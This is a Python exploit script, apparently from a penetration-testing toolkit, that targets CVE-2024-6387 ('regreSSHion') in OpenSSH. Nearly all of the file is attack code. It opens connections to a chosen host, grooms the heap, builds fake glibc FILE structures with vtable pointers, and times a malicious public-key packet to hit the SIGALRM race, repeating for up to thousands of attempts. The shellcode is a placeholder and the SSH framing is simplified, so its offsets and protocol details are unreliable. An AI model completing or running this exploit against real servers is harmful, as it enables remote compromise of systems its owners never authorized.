#!/usr/bin/env python3
# =============================================================================
# VAPT Toolkit - Vulnerability Assessment and Penetration Testing Toolkit
# =============================================================================
#
# Author: Keith Pachulski
# Company: Red Cell Security, LLC
# Email: keith@redcellsecurity.org
# Website: www.redcellsecurity.org
#
# Copyright (c) 2025 Keith Pachulski. All rights reserved.
#
# License: This software is licensed under the MIT License.
#          You are free to use, modify, and distribute this software
#          in accordance with the terms of the license.
#
# Purpose: This script provides an automated installation and management system
#          for a vulnerability assessment and penetration testing
#          toolkit. It installs and configures security tools across multiple
#          categories including exploitation, web testing, network scanning,
#          mobile security, cloud security, and Active Directory testing.
#
# DISCLAIMER: This software is provided "as-is," without warranty of any kind,
#             express or implied, including but not limited to the warranties
#             of merchantability, fitness for a particular purpose, and non-infringement.
#             In no event shall the authors or copyright holders be liable for any claim,
#             damages, or other liability, whether in an action of contract, tort, or otherwise,
#             arising from, out of, or in connection with the software or the use or other dealings
#             in the software.
#
# NOTICE: This toolkit is intended for authorized security testing only.
#         Users are responsible for ensuring compliance with all applicable laws
#         and regulations. Unauthorized use of these tools may violate local,
#         state, federal, and international laws.
#
# =============================================================================
"""
CVE-2024-6387 (regreSSHion) Exploit - Python Implementation
OpenSSH Remote Code Execution via Race Condition
"""

import socket
import struct
import time
import sys
import argparse
from typing import Optional, Tuple
import select

# Constants
MAX_PACKET_SIZE = 256 * 1024
LOGIN_GRACE_TIME = 120
MAX_STARTUPS = 100
CHUNK_ALIGN = lambda s: (s + 15) & ~15

# Possible glibc base addresses for ASLR bypass
GLIBC_BASES = [0xb7200000, 0xb7400000]

# Shellcode placeholder (replace with actual payload)
SHELLCODE = b"\x90" * 4


class SSHExploit:
    """Exploit handler for CVE-2024-6387 regreSSHion vulnerability"""

    def __init__(self, target_ip: str, target_port: int, verbose: bool = True):
        self.target_ip = target_ip
        self.target_port = target_port
        self.verbose = verbose
        self.sock: Optional[socket.socket] = None

    def log(self, message: str):
        """Conditional logging based on verbosity setting"""
        if self.verbose:
            print(f"[*] {message}")

    def setup_connection(self) -> bool:
        """Establish TCP connection to target SSH server"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65536)
            self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            self.sock.settimeout(30)  # Keep blocking mode with timeout
            self.sock.connect((self.target_ip, self.target_port))
            self.log(f"Connected to {self.target_ip}:{self.target_port}")
            return True
        except Exception as e:
            print(f"[-] Connection failed: {e}")
            return False

    def send_ssh_version(self):
        """Send SSH protocol version string"""
        version = b"SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.1\r\n"
        try:
            self.sock.send(version)
            self.log("Sent SSH version string")
        except Exception as e:
            print(f"[-] Failed to send version: {e}")
            raise

    def receive_ssh_version(self) -> bool:
        """Receive and parse SSH version from server"""
        try:
            version = self.sock.recv(256)
            if version:
                self.log(f"Received version: {version.decode('utf-8', errors='ignore').strip()}")
                return True
        except socket.timeout:
            print("[-] Timeout waiting for SSH version")
        except Exception as e:
            print(f"[-] Failed to receive version: {e}")
        return False

    def send_packet(self, packet_type: int, data: bytes):
        """Send SSH protocol packet with proper framing"""
        packet_len = len(data) + 1  # +1 for packet type

        # Build packet: length (4 bytes) + padding (1 byte) + type (1 byte) + data
        packet = struct.pack('>I', packet_len)
        packet += bytes([0])  # Padding length (simplified)
        packet += bytes([packet_type])
        packet += data

        try:
            # Send all data, handling partial sends
            total_sent = 0
            while total_sent < len(packet):
                sent = self.sock.send(packet[total_sent:])
                if sent == 0:
                    raise RuntimeError("Socket connection broken")
                total_sent += sent

            # Small delay to prevent buffer overflow
            time.sleep(0.001)
        except Exception as e:
            print(f"[-] Failed to send packet: {e}")
            raise

    def send_kex_init(self):
        """Send SSH Key Exchange Init packet"""
        kexinit_payload = b'\x00' * 36
        self.send_packet(20, kexinit_payload)  # SSH_MSG_KEXINIT
        self.log("Sent KEX_INIT")

    def receive_kex_init(self) -> bool:
        """Receive Key Exchange Init from server"""
        try:
            data = self.sock.recv(4096)  # Larger buffer for KEX
            if data:
                self.log(f"Received KEX_INIT ({len(data)} bytes)")
                return True
        except socket.timeout:
            print("[-] Timeout waiting for KEX_INIT")
        except Exception as e:
            print(f"[-] Failed to receive KEX_INIT: {e}")
        return False

    def perform_ssh_handshake(self) -> bool:
        """Complete initial SSH protocol handshake"""
        try:
            self.send_ssh_version()
            if not self.receive_ssh_version():
                return False

            self.send_kex_init()
            if not self.receive_kex_init():
                return False

            self.log("SSH handshake completed")
            return True
        except Exception as e:
            print(f"[-] Handshake failed: {e}")
            return False

    def prepare_heap(self):
        """
        Heap grooming strategy:
        - Packet a: Allocate/free tcache chunks
        - Packet b: Create 27 pairs of large (~8KB) and small (320B) holes
        - Packet c: Write fake FILE structures
        - Packet d: Trigger malloc bin organization with large allocation
        """
        self.log("Starting heap preparation...")

        # Packet a: Populate tcache with freed chunks
        for i in range(10):
            tcache_chunk = b'A' * 64
            self.send_packet(5, tcache_chunk)  # SSH_MSG_IGNORE

        # Packet b: Create alternating large/small holes
        for i in range(27):
            # Large chunk (~8KB)
            large_hole = b'B' * 8192
            self.send_packet(5, large_hole)

            # Small chunk (320B) - potential FILE structure location
            small_hole = b'C' * 320
            self.send_packet(5, small_hole)

        # Packet c: Write fake FILE structures with vtable/codecvt pointers
        for i in range(27):
            fake_data = self.create_fake_file_structure(4096, GLIBC_BASES[0])
            self.send_packet(5, fake_data)

        # Packet d: Large allocation to organize malloc bins
        large_string = b'E' * (MAX_PACKET_SIZE - 100)
        self.send_packet(5, large_string)

        self.log("Heap preparation completed")

    def create_fake_file_structure(self, size: int, glibc_base: int) -> bytes:
        """
        Create fake FILE structure for arbitrary write primitive
        Exploits _IO_wfile_jumps vtable for code execution
        """
        data = bytearray(size)

        # Set _vtable_offset to 0x61 (per advisory)
        struct.pack_into('<Q', data, 0xd8, 0x61)

        # Fake vtable pointer (_IO_wfile_jumps)
        struct.pack_into('<Q', data, size - 16, glibc_base + 0x21b740)

        # Fake _codecvt pointer
        struct.pack_into('<Q', data, size - 8, glibc_base + 0x21d7f8)

        return bytes(data)

    def measure_response_time(self, error_type: int) -> float:
        """
        Measure server parsing time for timing attack
        error_type 1: Error before sshkey_from_blob
        error_type 2: Error after sshkey_from_blob
        """
        if error_type == 1:
            error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC3"
        else:
            error_packet = b"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAAAQQDZy9"

        try:
            start_time = time.perf_counter()
            self.send_packet(50, error_packet)  # SSH_MSG_USERAUTH_REQUEST

            # Wait for response with timeout
            self.sock.settimeout(5)
            self.sock.recv(1024)
            end_time = time.perf_counter()

            return end_time - start_time
        except socket.timeout:
            # Timeout is acceptable for timing measurement
            return time.perf_counter() - start_time
        except Exception as e:
            print(f"[-] Timing measurement error: {e}")
            return 0.1

    def time_final_packet(self) -> float:
        """Calculate server parsing time via timing differential"""
        time_before = self.measure_response_time(1)
        time_after = self.measure_response_time(2)
        parsing_time = time_after - time_before

        self.log(f"Estimated parsing time: {parsing_time:.6f} seconds")
        return parsing_time

    def create_public_key_packet(self, glibc_base: int) -> bytes:
        """
        Create malicious public key packet with:
        - Heap spray pattern (27 large/small allocations)
        - Fake FILE structures
        - Shellcode payload
        """
        packet = bytearray(MAX_PACKET_SIZE)
        offset = 0

        # Header
        packet[0:8] = b"ssh-rsa "
        offset = 8

        # Create 27 allocation pairs
        for i in range(27):
            # malloc(~4KB) marker
            struct.pack_into('<I', packet, offset, CHUNK_ALIGN(4096))
            offset += CHUNK_ALIGN(4096)

            # malloc(304) marker - FILE structure
            struct.pack_into('<I', packet, offset, CHUNK_ALIGN(304))

            # Embed fake FILE structure
            fake_file = self.create_fake_file_structure(CHUNK_ALIGN(304), glibc_base)
            packet[offset:offset+len(fake_file)] = fake_file
            offset += CHUNK_ALIGN(304)

        # Embed shellcode in middle chunk
        shellcode_offset = CHUNK_ALIGN(4096) * 13 + CHUNK_ALIGN(304) * 13
        packet[shellcode_offset:shellcode_offset+len(SHELLCODE)] = SHELLCODE

        return bytes(packet)

    def attempt_race_condition(self, parsing_time: float, glibc_base: int, connection_start_time: float) -> bool:
        """
        Execute race condition exploit:
        1. Wait until near LOGIN_GRACE_TIME (120s from connection)
        2. Send all but last byte of malicious packet
        3. Precisely time final byte so parsing happens during SIGALRM handler
        """
        final_packet = self.create_public_key_packet(glibc_base)

        # Calculate when to send based on connection start time
        elapsed_since_connect = time.perf_counter() - connection_start_time
        time_until_alarm = LOGIN_GRACE_TIME - elapsed_since_connect

        # Wait until we're close to SIGALRM (minus parsing time and safety buffer)
        wait_time = time_until_alarm - parsing_time - 0.5  # 500ms safety buffer

        if wait_time > 0:
            self.log(f"Waiting {wait_time:.2f}s for race window...")
            time.sleep(wait_time)
        else:
            self.log(f"Warning: Already past ideal timing (elapsed: {elapsed_since_connect:.2f}s)")

        try:
            # Send all but last byte
            sent = self.sock.send(final_packet[:-1])
            if sent != len(final_packet) - 1:
                print(f"[-] Incomplete send: {sent}/{len(final_packet)-1}")
                return False

            self.log("Sent packet minus final byte")

            # Precise timing: wait until 1ms before SIGALRM
            race_start = time.perf_counter()
            target_delay = parsing_time - 0.001  # Send 1ms before alarm

            while True:
                elapsed = time.perf_counter() - race_start
                if elapsed >= target_delay:
                    # Send final byte to trigger parsing during SIGALRM
                    self.sock.send(final_packet[-1:])
                    self.log(f"Sent final byte at T+{time.perf_counter() - connection_start_time:.3f}s")
                    break
                time.sleep(0.0001)  # 100Î¼s granularity

            # Check for exploitation indicators
            time.sleep(0.5)
            try:
                self.sock.settimeout(2)
                response = self.sock.recv(1024)

                if response:
                    self.log(f"Received response ({len(response)} bytes)")
                    if not response.startswith(b"SSH-2.0-"):
                        self.log("Possible hit on 'large' race window!")
                        return True
                else:
                    self.log("Connection closed - possible successful exploitation")
                    return True
            except socket.timeout:
                self.log("No response - possible successful exploitation")
                return True

        except Exception as e:
            print(f"[-] Race condition attempt failed: {e}")

        return False

    def exploit(self, max_attempts: int = 10000) -> bool:
        """Main exploitation loop with proper timing"""
        timing_adjustment = 0.0

        for base_idx, glibc_base in enumerate(GLIBC_BASES):
            print(f"\n[+] Attempting exploitation with glibc base: 0x{glibc_base:x}")

            for attempt in range(max_attempts):
                if attempt % 100 == 0:  # Reduced frequency since each attempt is 120s
                    print(f"[*] Attempt {attempt}/{max_attempts}")

                # Track connection start time for race timing
                connection_start = time.perf_counter()

                if not self.setup_connection():
                    continue

                try:
                    if not self.perform_ssh_handshake():
                        self.log("Handshake failed, retrying...")
                        self.close()
                        continue

                    # Heap grooming (do this early while we have time)
                    self.prepare_heap()

                    # Measure parsing time (needs to happen before the wait)
                    parsing_time = self.time_final_packet()
                    parsing_time += timing_adjustment

                    self.log(f"Adjusted parsing time: {parsing_time:.6f}s")

                    # Now attempt the race condition with connection start time
                    if self.attempt_race_condition(parsing_time, glibc_base, connection_start):
                        print(f"\n[+] Possible exploitation success!")
                        print(f"[+] Attempt: {attempt}")
                        print(f"[+] glibc base: 0x{glibc_base:x}")
                        return True

                    timing_adjustment += 0.00001

                except Exception as e:
                    print(f"[-] Attempt {attempt} failed: {e}")
                finally:
                    self.close()
                    # No sleep needed - each attempt already takes 120+ seconds

        return False

    def close(self):
        """Clean up socket connection"""
        if self.sock:
            try:
                self.sock.close()
            except:
                pass
            self.sock = None


def main():
    parser = argparse.ArgumentParser(
        description='CVE-2024-6387 (regreSSHion) Exploit - Authorized Testing Only',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s -t 192.168.1.100 -p 22
  %(prog)s -t target.example.com -p 2222 -a 5000 -q
        """
    )

    parser.add_argument('-t', '--target', required=True,
                       help='Target IP address or hostname')
    parser.add_argument('-p', '--port', type=int, default=22,
                       help='SSH port (default: 22)')
    parser.add_argument('-a', '--attempts', type=int, default=10000,
                       help='Maximum exploitation attempts (default: 10000)')
    parser.add_argument('-q', '--quiet', action='store_true',
                       help='Reduce output verbosity')

    args = parser.parse_args()

    print("=" * 70)
    print("CVE-2024-6387 (regreSSHion) Exploit")
    print("OpenSSH Remote Code Execution - Race Condition")
    print("For Authorized Penetration Testing Only")
    print("=" * 70)
    print(f"\nTarget: {args.target}:{args.port}")
    print(f"Max Attempts: {args.attempts}")
    print(f"Note: Advisory indicates ~10,000 attempts on average\n")

    exploit = SSHExploit(args.target, args.port, verbose=not args.quiet)

    try:
        success = exploit.exploit(max_attempts=args.attempts)
        if success:
            print("\n[+] Exploitation potentially successful!")
            print("[*] Verify access and document findings")
            sys.exit(0)
        else:
            print("\n[-] Exploitation unsuccessful after maximum attempts")
            print("[*] Target may be patched or exploitation parameters need adjustment")
            sys.exit(1)
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(130)
    except Exception as e:
        print(f"\n[!] Fatal error: {e}")
        sys.exit(1)
    finally:
        exploit.close()


if __name__ == '__main__':
    main()
